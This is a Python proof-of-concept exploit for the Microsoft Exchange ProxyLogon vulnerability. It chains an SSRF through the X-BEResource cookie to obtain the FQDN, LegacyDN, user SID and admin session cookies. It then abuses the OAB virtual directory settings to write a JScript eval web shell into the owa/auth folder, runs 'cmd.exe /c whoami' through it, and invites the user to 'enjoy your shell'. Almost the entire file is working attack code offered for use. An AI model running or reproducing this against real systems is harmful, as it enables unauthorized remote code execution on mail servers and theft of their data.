#!/usr/bin/env python3

#############################################
# Microsoft Exchange ProxyLogon poC
# Author: @donnymaasland
#
# Disclaimer: I googled all of this info and 
# pasted it together. None of this is mine.
#
# Enjoy.
#############################################

# Imports
import requests
import urllib3
import random
import string
import time

from xml.etree import ElementTree

# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Classes
class Exchange:
    """A Simple class to keep track of Exchange info"""

    def __init__(self, url, email):

        self.url = url
        self.email = email
        self.js = f'{self.rand_name()}.js'
        self.session = requests.Session()
        self.fqdn = None
        self.legacydn = None
        self.sid = None
        self.oab_id = None
        self.shell = self.get_shell()
        self.shell_name = f'{self.rand_name()}.aspx'
        self.shell_path = f'\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\{self.shell_name}'

    def get_shell(self):
        shell = '<script language="JScript" runat="server">'
        shell += 'function Page_Load(){'
        shell += '/**/eval(Request["exec_code"],"unsafe");}'
        shell += '</script>'
        return shell

    def rand_name(self):
        """Returns a random filename to use for all requests"""
        chars = string.ascii_lowercase + string.digits
        rand = ''.join(random.choice(chars) for _ in range(5))
        return rand

    def set_ssrf_cookie(self, url, overwrite_url=None):
        """The vulnerability is in the "X-BEResource" cookie."""
        rand_num = random.randrange(10000000)

        if overwrite_url:
            base_url = overwrite_url
        else:
            base_url = f'Admin@{self.fqdn}:444'

        if '?' in url:
            param_char = '&'
        else:
            param_char = '?'

        self.session.cookies.set(
            'X-BEResource',
            f'{base_url}{url}{param_char}x=~{rand_num}'
        )

    def get(self, ssrf="", overwrite_url=None, headers=None, verify=False):
        """Call Exchange using GET"""
        self.set_ssrf_cookie(
            url = ssrf,
            overwrite_url = overwrite_url
        )

        url = f'https://{self.url}/ecp/{self.js}'
        
        response = self.session.get(
            url = url,
            headers = headers,
            verify = verify
        )

        return response

    def post(self, ssrf="", overwrite_url=None, data=None, json=None, headers=None, verify=False):
        """Call Exchange using POST"""
        self.set_ssrf_cookie(
            url = ssrf,
            overwrite_url = overwrite_url
        )

        url = f'https://{self.url}/ecp/{self.js}'
        
        response = self.session.post(
            url = url,
            headers = headers,
            data = data,
            json = json,
            verify = verify
        )

        return response

# Functions
def step_1(exchange):
    """This step uses an error page to retrieve the exchange FQDN.
    Defaults to "exchange" if not found"""
    response = exchange.get(
        overwrite_url='localhost'
    )

    if 'X-FEServer' in response.headers and 'X-CalculatedBETarget' in response.headers:
        exchange.fqdn = response.headers['X-FEServer']
    else:
        exchange.fqdn = 'EXCHANGE'

def step_2(exchange):
    """This step does an autodiscover request via SSRF to get the 'LegacyDN'"""
    autodiscover = '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">\n'
    autodiscover += '  <Request>\n'
    autodiscover += f'    <EMailAddress>{exchange.email}</EMailAddress>\n'
    autodiscover += '    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>\n'
    autodiscover += '  </Request>\n'
    autodiscover += '</Autodiscover>'

    headers = {
        'Content-Type': 'text/xml'
    }

    response = exchange.post(
        ssrf = '/autodiscover/autodiscover.xml',
        headers = headers,
        data = autodiscover,
        overwrite_url = exchange.fqdn
    )

    autodiscover_xml = ElementTree.fromstring(response.content)
    
    exchange.legacydn = autodiscover_xml.find(
        '{*}Response/{*}User/{*}LegacyDN'
    ).text

def step_3(exchange):
    """This step gets the user SID"""
    mapi = exchange.legacydn
    mapi += '\x00\x00\x00\x00\x00\xe4\x04'
    mapi += '\x00\x00\x09\x04\x00\x00\x09'
    mapi += '\x04\x00\x00\x00\x00\x00\x00'

    headers = {
        "X-Requesttype": 'Connect',
        "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
        "X-Clientapplication": 'Outlook/15.0.4815.1002',
        "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
        'Content-Type': 'application/mapi-http'
    }

    response = exchange.post(
        ssrf = '/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab',
        headers = headers,
        data = mapi
    )

    exchange.sid = response.text.split("with SID ")[1].split(" and MasterAccountSid")[0]

def step_4(exchange):
    """This step gets the needed cookies"""
    user = exchange.email.split('@')[0]
    proxylogon = f'<r at="NTLM" ln="{user}">'
    proxylogon += f'<s>{exchange.sid}</s>'
    proxylogon += '</r>'
    
    headers = {
        'Content-Type': 'text/xml',
        'msExchLogonMailbox': 'S-1-5-20'
    }

    response = exchange.post(
        ssrf = '/ecp/proxyLogon.ecp',
        headers = headers,
        data = proxylogon
    )

def step_5(exchange):
    """This step gets the OAB ID"""
    json_data = {
        "filter": {
            "Parameters": {
                "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "SelectedView": "",
                "SelectedVDirType": "All"
            }
        },
        "sort": {}
    }

    headers = {
        "X-Requesttype": 'Connect',
        "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
        "X-Clientapplication": 'Outlook/15.0.4815.1002',
        "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
        'msExchLogonMailbox': 'S-1-5-20'
    }

    ssrf_url = '/ecp/DDI/DDIService.svc/GetObject'
    ssrf_url += '?schema=OABVirtualDirectory'
    ssrf_url += f'&msExchEcpCanary={exchange.session.cookies["msExchEcpCanary"]}'

    response = exchange.post(
        ssrf = ssrf_url,
        json = json_data,
        headers = headers
    )

    exchange.oab_id = response.json()['d']['Output'][0]['Identity']

def step_6(exchange):
    """This step sets an external OAB URL."""

    json_data = {
        'identity': exchange.oab_id,
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                'ExternalUrl': f'http://ffff/#{exchange.shell}'
            }
        }
    }

    headers = {
        'msExchLogonMailbox': 'S-1-5-20'
    }

    ssrf_url = '/ecp/DDI/DDIService.svc/SetObject'
    ssrf_url += '?schema=OABVirtualDirectory'
    ssrf_url += f'&msExchEcpCanary={exchange.session.cookies["msExchEcpCanary"]}'

    response = exchange.post(
        ssrf = ssrf_url,
        json = json_data,
        headers = headers
    )
    
def step_7(exchange):
    """This step writes the shell to disk"""

    json_data = {
        'identity': exchange.oab_id,
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                'FilePathName': exchange.shell_path
            }
        }
    }

    headers = {
        'msExchLogonMailbox': 'S-1-5-20'
    }

    ssrf_url = '/ecp/DDI/DDIService.svc/SetObject'
    ssrf_url += '?schema=ResetOABVirtualDirectory'
    ssrf_url += f'&msExchEcpCanary={exchange.session.cookies["msExchEcpCanary"]}'

    response = exchange.post(
        ssrf = ssrf_url,
        json = json_data,
        headers = headers
    )

def main():
    """Runs the exploit steps one by one"""

    # Create exchange object
    exchange = Exchange(
        url = "URL HERE",
        email = "admin@lab.local"
    )

    print('[-] Getting FQDN..')
    step_1(exchange)
    print(f'[+] FQDN: {exchange.fqdn}')

    print('[-] Getting LegacyDN..')
    step_2(exchange)
    print(f'[+] LegacyDN: {exchange.legacydn}')

    print('[-] Getting SID..')
    step_3(exchange)
    print(f'[+] SID: {exchange.sid}')

    print('[-] Getting Cookies..')
    step_4(exchange)
    print(f'[+] Session ID: {exchange.session.cookies["ASP.NET_SessionId"]}')
    print(f'[+] msExchEcpCanary: {exchange.session.cookies["msExchEcpCanary"]}')

    print('[-] Get OAB ID..')
    step_5(exchange)
    print(f'[+] OAB ID: {exchange.oab_id["RawIdentity"]}')

    print('[-] Setting external OAB URL..')
    step_6(exchange)

    print('[-] Writing shell..')
    step_7(exchange)

    print('[-] Testing shell..')
    time.sleep(5)
    delimit = exchange.rand_name()
    response = requests.post(
        url = f'https://{exchange.url}/owa/auth/{exchange.shell_name}',
        verify = False,
        data = {
            'exec_code': f'Response.Write("{delimit}" + new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll() + "{delimit}");'
        }
    )
    print(f'[+] Output: {response.text.split(delimit)[1]}')
    print(f'[+] Enjoy your shell at: https://{exchange.url}/owa/auth/{exchange.shell_name}')

# Run main
if __name__ == '__main__':
    main()
